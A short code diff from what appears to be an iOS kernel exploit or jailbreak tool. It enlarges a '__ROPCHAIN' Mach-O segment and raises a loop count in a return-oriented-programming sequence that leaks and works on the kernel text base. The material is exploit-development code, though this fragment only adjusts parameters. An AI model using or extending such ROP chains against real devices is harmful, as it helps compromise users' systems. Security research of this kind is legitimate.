@@ -509,8 +509,8 @@ int main(int argc, const char * argv[]) {
     
     load_cmd_seg.vmaddr = 0x51000000;
     load_cmd_seg.fileoff = fsz;
-    load_cmd_seg.filesize = 0x500000;
-    load_cmd_seg.vmsize = 0x500000;
+    load_cmd_seg.filesize = 0xA00000;
+    load_cmd_seg.vmsize = 0xA00000;
     strcpy(&load_cmd_seg.segname[0], "__ROPCHAIN");
     memcpy(buf + mh.sizeofcmds + sizeof(mh), &load_cmd_seg, load_cmd_seg.cmdsize);
     mh.sizeofcmds += load_cmd_seg.cmdsize;
@@ -1543,7 +1543,7 @@ step(i);\
     RopCallFunction9Deref2(PUSH, @"__simple_dprintf", 0, SEG_VAR(fd1), 2, SEG_VAR(kern_text_base),0,SEG_VAR(testmsg),0,0,0,0,0,0,0);
     [dy setSlide:dy.slide-1]; // exit thumb
     
-    for (int i = 0; i < 0x60; i++) {
+    for (int i = 0; i < 0x600; i++) {
         ReadWriteOverlap();
         tmptoscratch();
         LoadIntoR0(PUSH, SEG_VAR(kern_text_base));
